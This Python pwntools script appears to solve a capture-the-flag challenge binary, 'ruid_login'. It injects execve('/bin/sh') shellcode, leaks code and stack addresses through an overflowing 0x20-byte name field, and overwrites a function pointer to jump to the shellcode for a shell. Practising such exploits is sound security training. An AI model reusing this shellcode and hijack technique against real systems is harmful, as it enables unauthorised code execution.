from pwn import *

def debug():
    pid = io.proc.pid
    subprocess.run(["gnome-terminal", "--", "zsh", "-c", "gdb -nx -x ~/Desktop/Utils/custom_gdb.py -x g -p " + str(pid)])


io = process("./ruid_login")

shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"
io.sendlineafter(b"your netID", shellcode)


io.sendlineafter(b"your RUID", b"846930886")
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20)
io.recvuntil(b"a"*0x20)
leak = io.recv(6)
leak = u64(b"\xf3" + leak[1:] + b"\x00"*2)

# setup_users = leak + (0x563beb80f56d - 0x563beb80f2f3)
# students = leak + (0x561f814e1020 - 0x561f814de2f3)
# stdout_libc = leak + (0x561f814e10c0 - 0x561f814de2f3)
# read_at_plt = setup_users - (0x563c866d056d - 0x563c866d00a0)
# puts_at_plt = read_at_plt - 0x50
# read_in_code = stdout_libc - (0x5622f410b0c0 - 0x00005622f410870e)
# printf_in_code = read_in_code + (0x74a-0x70e)
# printf2_in_code = read_in_code - (0x70e-0x22a)
# print(hex(setup_users))
# print(hex(students))
# print(hex(stdout_libc))

print(hex(leak))
puts_at_plt = leak - (0x55ac1c8742f3 - 0x55ac1c874050)

# #resetup 
# io.sendlineafter(b"your RUID", b"846930886")
# io.sendlineafter(b"Num:", b"1")
# io.sendlineafter(b"New name:", b"a"*0x20 + p64(setup_users))
# new_id = 0x00000000327b230a
# io.sendlineafter(b"your RUID", str(new_id).encode())


# on va set le prof a puts
io.sendlineafter(b"your RUID", b"846930886")
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20 + p64(puts_at_plt))
new_id = 0x000000006b8b450a

# et leak une adresse de stack
io.sendlineafter(b"your RUID", str(new_id).encode())
io.recvuntil(b"a"*0x20)
io.recv(8)
leak_stack = u64(io.recv(6) + b"\x00"*2)
shell_at = leak_stack + (0x7ffed92d7aa0 - 0x7ffed92d78e0)
print(hex(leak_stack))
print(hex(shell_at))
# # on va set le prof a l'adresse de notre shellcode
io.sendlineafter(b"your RUID", b"846930886")
io.sendlineafter(b"Num:", b"0")
io.sendlineafter(b"New name:", b"a"*0x20 + p64(shell_at))

# # et on exec notre shellcode
io.sendlineafter(b"your RUID", str(new_id).encode())

debug()
io.interactive()


